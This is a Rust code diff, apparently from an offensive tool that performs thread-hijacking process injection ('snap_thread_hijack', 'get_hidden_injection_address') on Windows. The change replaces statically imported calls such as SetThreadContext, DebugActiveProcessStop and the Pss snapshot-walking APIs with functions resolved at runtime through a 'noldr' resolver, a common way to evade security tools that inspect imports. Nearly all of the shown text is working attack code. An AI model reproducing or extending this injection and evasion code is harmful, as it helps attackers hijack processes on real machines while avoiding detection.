@@ -17,10 +17,8 @@ use winapi::{
         winerror::ERROR_SUCCESS,
     },
     um::{
-        debugapi::DebugActiveProcessStop,
         heapapi::{GetProcessHeap, HeapAlloc, HeapFree},
         memoryapi::{ReadProcessMemory, VirtualProtectEx, WriteProcessMemory},
-        processthreadsapi::SetThreadContext,
         winnt::{
             CONTEXT, HANDLE, HEAP_ZERO_MEMORY, MEMORY_BASIC_INFORMATION, MEM_IMAGE,
             PAGE_EXECUTE_READ, PAGE_READWRITE,
@@ -30,7 +28,9 @@ use winapi::{
 
 // Windows-rs imports
 use windows::Win32::System::Diagnostics::ProcessSnapshotting::{
-    PssWalkMarkerCreate, PssWalkMarkerFree, PssWalkSnapshot, HPSS, HPSSWALK, PSS_ALLOCATOR, PSS_CAPTURE_FLAGS, PSS_CAPTURE_THREADS, PSS_CAPTURE_THREAD_CONTEXT, PSS_THREAD_ENTRY, PSS_VA_SPACE_ENTRY, PSS_WALK_INFORMATION_CLASS, PSS_WALK_THREADS, PSS_WALK_VA_SPACE
+    PssWalkMarkerCreate, PssWalkMarkerFree, PssWalkSnapshot, HPSS, HPSSWALK, PSS_ALLOCATOR,
+    PSS_CAPTURE_FLAGS, PSS_CAPTURE_THREADS, PSS_CAPTURE_THREAD_CONTEXT, PSS_THREAD_ENTRY,
+    PSS_VA_SPACE_ENTRY, PSS_WALK_INFORMATION_CLASS, PSS_WALK_THREADS, PSS_WALK_VA_SPACE,
 };
 
 pub fn get_helper(
@@ -53,7 +53,7 @@ pub fn get_helper(
         }
     }
 }
-//need to get rid of this. this repo doesn't use dynamic resolution. and instead of re-running the capture, I should be able to pass 
+//need to get rid of this. this repo doesn't use dynamic resolution. and instead of re-running the capture, I should be able to pass
 //whats needed to get_hidden_injection_address
 pub fn capture_process_snapshot(handle: HANDLE) -> Result<ProcessSnapshot, String> {
     //println!("Capturing process...");
@@ -345,32 +345,26 @@ pub fn snap_thread_hijack(
             noldr::get_function_address(kernel32, "PssWalkMarkerCreate");
 
         //define the function signature
-        type PssWalkMarkerCreateFn = unsafe extern "system" fn(
-            *const PSS_ALLOCATOR,
-            *mut HPSSWALK
-        ) -> u32;
+        type PssWalkMarkerCreateFn =
+            unsafe extern "system" fn(*const PSS_ALLOCATOR, *mut HPSSWALK) -> u32;
 
         //call the function
         let pss_result = unsafe {
-            std::mem::transmute::<_, PssWalkMarkerCreateFn>(
-                match pss_walk_marker_create_address {
-                    Some(addr) => addr,
-                    None => return false,
-                }
-            )(std::ptr::null(), &mut walk_marker_handle)
+            std::mem::transmute::<_, PssWalkMarkerCreateFn>(match pss_walk_marker_create_address {
+                Some(addr) => addr,
+                None => return false,
+            })(std::ptr::null(), &mut walk_marker_handle)
         };
-        
+
         if pss_result != 0 {
-            eprintln!(
-                "[!] PssWalkMarkerCreate failed: Win32 error {}",
-                unsafe { winapi::um::errhandlingapi::GetLastError() }
-            );
+            eprintln!("[!] PssWalkMarkerCreate failed: Win32 error {}", unsafe {
+                winapi::um::errhandlingapi::GetLastError()
+            });
             return false;
         }
 
         //get the function address for PssWalkSnapshot
-        let pss_walk_snapshot_address =
-            noldr::get_function_address(kernel32, "PssWalkSnapshot");
+        let pss_walk_snapshot_address = noldr::get_function_address(kernel32, "PssWalkSnapshot");
 
         //define the function signature
         type PssWalkSnapshotFn = unsafe extern "system" fn(
@@ -378,27 +372,23 @@ pub fn snap_thread_hijack(
             PSS_WALK_INFORMATION_CLASS,
             HPSSWALK,
             *mut std_c_void,
-            DWORD  // Added BufferLength parameter
+            DWORD, // Added BufferLength parameter
         ) -> u32;
 
         //call the function
         let pss_result = unsafe {
-            std::mem::transmute::<_, PssWalkSnapshotFn>(
-                match pss_walk_snapshot_address {
-                    Some(addr) => addr,
-                    None => return false,
-                }
-            )(
-                snapshot_handle, 
-                PSS_WALK_THREADS, 
-                walk_marker_handle, 
+            std::mem::transmute::<_, PssWalkSnapshotFn>(match pss_walk_snapshot_address {
+                Some(addr) => addr,
+                None => return false,
+            })(
+                snapshot_handle,
+                PSS_WALK_THREADS,
+                walk_marker_handle,
                 buffer.as_mut_ptr() as *mut std_c_void,
-                buffer.len() as DWORD
+                buffer.len() as DWORD,
             )
         };
 
-        //YOU ARE HERE
-       
         while pss_result == 0 {
             // Copy buffer to thread_entry
             std::ptr::copy_nonoverlapping(
@@ -437,7 +427,30 @@ pub fn snap_thread_hijack(
 
                     //println!("[+] Setting thread context...");
 
-                    if SetThreadContext(thread_handle, &snapshot_ctx) == FALSE {
+                    //locate the function address for SetThreadContext
+                    let set_thread_context_address =
+                        noldr::get_function_address(kernel32, "SetThreadContext");
+
+                    //define the function signature
+                    type SetThreadContextFn =
+                        unsafe extern "system" fn(
+                            HANDLE,
+                            *const CONTEXT,
+                        )
+                            -> winapi::shared::minwindef::BOOL;
+
+                    //define the function
+                    let set_thread_context = unsafe {
+                        std::mem::transmute::<_, SetThreadContextFn>(
+                            match set_thread_context_address {
+                                Some(addr) => addr,
+                                None => return false,
+                            },
+                        )
+                    };
+
+                    //call the function
+                    if set_thread_context(thread_handle, &snapshot_ctx) == FALSE {
                         eprintln!(
                             "[!] SetThreadContext FAILED with Error: {}",
                             winapi::um::errhandlingapi::GetLastError()
@@ -447,41 +460,67 @@ pub fn snap_thread_hijack(
 
                     std::thread::sleep(std::time::Duration::from_secs(5));
 
+                    //locate the function address for DebugActiveProcessStop
+                    let debug_active_process_stop_address =
+                        noldr::get_function_address(kernel32, "DebugActiveProcessStop");
+
+                    //define the function signature
+                    type DebugActiveProcessStopFn =
+                        unsafe extern "system" fn(DWORD) -> winapi::shared::minwindef::BOOL;
+
+                    //call the function
+                    let debug_active_process_stop = unsafe {
+                        std::mem::transmute::<_, DebugActiveProcessStopFn>(
+                            match debug_active_process_stop_address {
+                                Some(addr) => addr,
+                                None => return false,
+                            },
+                        )
+                    };
+
+                    //call the function
+                    if debug_active_process_stop(pid) == FALSE {
+                        eprintln!(
+                            "[!] DebugActiveProcessStop FAILED with Error: {}",
+                            winapi::um::errhandlingapi::GetLastError()
+                        );
+                        return false;
+                    }
+
                     //println!("[+] DebugActiveProcessStop...");
-                    DebugActiveProcessStop(pid);
+
                     //println!("[+] DONE");
                     break;
                 }
             }
 
-            //swap in our dynamic resolved veresion of PssWalkSnapshot instead of the one below that uses a crate
-
             let pss_result = unsafe {
-                std::mem::transmute::<_, PssWalkSnapshotFn>(
-                    match pss_walk_snapshot_address {
-                        Some(addr) => addr,
-                        None => return false,
-                    }
-                )(
-                    snapshot_handle, 
-                    PSS_WALK_THREADS, 
-                    walk_marker_handle, 
+                std::mem::transmute::<_, PssWalkSnapshotFn>(match pss_walk_snapshot_address {
+                    Some(addr) => addr,
+                    None => return false,
+                })(
+                    snapshot_handle,
+                    PSS_WALK_THREADS,
+                    walk_marker_handle,
                     buffer.as_mut_ptr() as *mut std_c_void,
-                    buffer.len() as DWORD
+                    buffer.len() as DWORD,
                 )
-                };
-            }
-/* 
-            pss_result = PssWalkSnapshot(
-                snapshot_handle,
-                PSS_WALK_THREADS,
-                walk_marker_handle,
-                Some(&mut buffer),
-            );
+            };
         }
-*/
-        // Free walk marker
-        let pss_result = PssWalkMarkerFree(walk_marker_handle);
+
+        //locate the function address for PssWalkMarkerFree 
+        let pss_walk_marker_free_address = noldr::get_function_address(kernel32, "PssWalkMarkerFree");
+
+        //define the function signature
+        type PssWalkMarkerFreeFn = unsafe extern "system" fn(HPSSWALK) -> u32;
+
+        //call the function
+        let pss_result = unsafe {
+            std::mem::transmute::<_, PssWalkMarkerFreeFn>(match pss_walk_marker_free_address {
+                Some(addr) => addr,
+                None => return false,
+            })(walk_marker_handle)
+        };
         if pss_result != 0 {
             eprintln!(
                 "[!] PssWalkMarkerFree failed: Win32 error {}",
